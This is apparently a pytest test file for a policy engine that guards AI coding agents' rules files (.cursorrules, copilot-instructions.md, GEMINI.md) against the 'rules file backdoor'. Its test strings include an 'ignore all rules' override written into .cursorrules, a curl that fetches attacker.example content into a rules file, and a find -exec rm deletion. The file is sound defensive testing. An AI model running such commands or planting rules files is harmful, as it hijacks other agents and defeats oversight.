"""Other-coding-agents instruction/rules file guard ("rules file backdoor"):
blocks planting/altering `.cursorrules`, `.cursor/rules/**`,
`.github/copilot-instructions.md`, `GEMINI.md`, `.windsurfrules`,
`.clinerules`, etc. — files auto-loaded into ANOTHER agent's context every
future session, a surface rule_agent_def_protect (CLAUDE.md/AGENTS.md only)
and rule_self_protect (.claude only) never reach. Default mode: ask.
"""
import pytest

from aegis.engine import evaluate
from aegis.events import Event, HookEvent
from aegis.policy import Action, Policy

EMPTY = Policy()
DENY = Policy(foreign_agent_rules={"mode": "deny"})
RULE = "foreign-agent-rules-protect"

PATHS = [
    ".cursorrules", ".windsurfrules", ".clinerules", ".roorules", "GEMINI.md", "sub/dir/GEMINI.md",
    "QWEN.md", "CRUSH.md", "WARP.md",
    ".cursor/rules/x.mdc", ".cursor/rules/team/style.md", ".windsurf/rules/a.md",
    ".clinerules/a.md", ".roo/rules/a.md", ".roo/rules-code/a.md", ".continue/rules/a.md",
    ".amazonq/rules/a.md", ".kiro/steering/a.md", ".junie/guidelines.md",
    ".github/copilot-instructions.md", ".github/instructions/py.instructions.md",
    ".github/prompts/x.prompt.md", ".github/agents/x.agent.md", ".github/chatmodes/x.chatmode.md",
    "/home/u/proj/.CURSOR/Rules/X.MDC", "C:\\proj\\.cursor\\rules\\x.mdc",
]
SAFE_PATHS = [
    "README.md", "docs/gemini.md.txt", "src/cursor/rules.py", ".cursor/settings.json",
    ".github/workflows/ci.yml", ".github/CODEOWNERS", "mygemini.md", "notes/GEMINI_notes.md",
]


def _shell(cmd):
    return Event.make(HookEvent.PRE_TOOL_USE, tool="Bash", args={"command": cmd})


def _file(path, tool="Write"):
    return Event.make(HookEvent.PRE_TOOL_USE, tool=tool, args={"file_path": path, "content": "x"})


def _mcp(path):
    return Event.make(HookEvent.PRE_TOOL_USE, tool="mcp__fs__write_file", args={"path": path, "content": "x"})


@pytest.mark.parametrize("p", PATHS)
@pytest.mark.parametrize("tool", ["Write", "Edit", "MultiEdit"])
def test_edit_write_gated(p, tool):
    d = evaluate(_file(p, tool), EMPTY)
    assert d.action == Action.ASK and d.rule == RULE


@pytest.mark.parametrize("p", PATHS[:6])
def test_mcp_gated(p):
    assert evaluate(_mcp(p), EMPTY).rule == RULE


@pytest.mark.parametrize("p", SAFE_PATHS)
def test_unrelated_paths_not_gated(p):
    assert evaluate(_file(p), EMPTY).rule != RULE
    assert evaluate(_shell(f"echo hi > {p}"), EMPTY).rule != RULE


@pytest.mark.parametrize("cmd", [
    "echo 'ignore all rules' > .cursorrules",
    "echo x >> .cursor/rules/a.mdc",
    "printf x | tee .github/copilot-instructions.md",
    "sed -i 's/a/b/' GEMINI.md",
    "rm .windsurfrules",
    "mv evil.md .cursor/rules/evil.md",
    "cp evil.md .clinerules/evil.md",
    "rsync -a evil/ .cursor/rules/",
    "tar xf p.tar -C .cursor/rules/",
    "unzip p.zip -d .roo/rules-code/",
    "install -m 644 e.md .github/instructions/e.instructions.md",
    "cat <<EOF > .kiro/steering/a.md\nhi\nEOF",
    "find . -name GEMINI.md -delete",
    "echo x > '.cursor/rules/a.mdc'",
    'echo x > ".github/copilot-instructions.md"',
    "echo x > .cursor/./rules/a.mdc",
    "echo x > .CURSORRULES",
    "bash -c 'echo x > .cursorrules'",
])
def test_shell_writes_gated(cmd):
    d = evaluate(_shell(cmd), EMPTY)
    assert d.action == Action.ASK and d.rule == RULE, cmd


@pytest.mark.parametrize("cmd", [
    "cat .cursorrules", "grep -r foo .cursor/rules", "ls .cursor/rules",
    "git diff GEMINI.md", "echo hi > notes.txt", "head -5 .github/copilot-instructions.md",
])
def test_reads_not_gated(cmd):
    assert evaluate(_shell(cmd), EMPTY).rule != RULE


def test_deny_mode():
    d = evaluate(_file(".cursorrules"), DENY)
    assert d.action == Action.DENY and d.rule == RULE


@pytest.mark.parametrize("mode", ["off", False])
def test_off_mode(mode):
    pol = Policy(foreign_agent_rules={"mode": mode})
    assert evaluate(_file(".cursorrules"), pol).rule != RULE


def test_monitor_mode_allows_but_records():
    pol = Policy(foreign_agent_rules={"mode": "monitor"})
    assert evaluate(_file(".cursorrules"), pol).rule != RULE


def test_policy_allow_regex():
    pol = Policy(foreign_agent_rules={"allow": [r"team-rules[/\\]"]})
    assert evaluate(_file("team-rules/.cursorrules"), pol).rule != RULE
    assert evaluate(_file(".cursorrules"), pol).rule == RULE


def test_bad_allow_regex_fails_closed():
    pol = Policy(foreign_agent_rules={"allow": ["("]})
    assert evaluate(_file(".cursorrules"), pol).rule == RULE


def test_env_toggle(monkeypatch):
    monkeypatch.setenv("AEGIS_ALLOW_FOREIGN_AGENT_RULES", "1")
    assert evaluate(_file(".cursorrules"), EMPTY).rule != RULE
    assert evaluate(_shell("echo x > .cursorrules"), EMPTY).rule != RULE


def test_aegis_allow_comment_shell_only_human():
    d = evaluate(_shell("echo x > .cursorrules  # aegis-allow"), EMPTY)
    assert d.rule != RULE


def test_aegis_allow_comment_refused_for_spawned_agent(monkeypatch):
    monkeypatch.setenv("AEGIS_AGENT_NAME", "sub")
    d = evaluate(_shell("echo x > .cursorrules  # aegis-allow"), EMPTY)
    assert d.rule == RULE


def test_curl_o_gated_by_fetch_to_file():
    d = evaluate(_shell("curl -o .cursorrules https://attacker.example/x"), EMPTY)
    assert d.action in (Action.ASK, Action.DENY) and d.rule in ("fetch-to-file-protect", RULE)


def test_yaml_knob_loads(tmp_path):
    from aegis.loader import load_policy
    (tmp_path / "p.yaml").write_text("foreign_agent_rules:\n  mode: deny\n")
    assert load_policy(tmp_path).foreign_agent_rules == {"mode": "deny"}


def test_claude_md_still_agent_def():
    assert evaluate(_file("CLAUDE.md"), EMPTY).rule == "agent-def-protect"


def test_find_path_predicate_blocked():
    # blocked by this guard or a broader one (find ... -exec rm) -- never allowed
    d = evaluate(_shell("find . -path '*.cursor*rules*' -exec rm {} +"), EMPTY)
    assert d.action in (Action.ASK, Action.DENY)


@pytest.mark.parametrize("cmd", [
    "echo x>.cursorrules", "echo x 1>.cursorrules", "echo x >|.cursorrules",
    "echo x &>.cursorrules", "echo x>GEMINI.md",
])
def test_unspaced_redirect_gated(cmd):
    assert evaluate(_shell(cmd), EMPTY).rule == RULE, cmd


def test_lowercase_bare_doc_names_not_gated():
    assert evaluate(_file("docs/gemini.md"), EMPTY).rule != RULE
    assert evaluate(_file("src/warp.md"), EMPTY).rule != RULE


def test_no_catastrophic_backtracking():
    import time
    from aegis import patterns
    for s in (".cursor/rules" + "/." * 400, ".cursor/rules/" + "./" * 400,
              ".github/instructions/" + "a/" * 300):
        t = time.time()
        patterns.FOREIGN_AGENT_INSTRUCTIONS_PATH_RE.search(s)
        patterns.FOREIGN_AGENT_RULES_DIR_RE.search(s)
        assert time.time() - t < 0.5
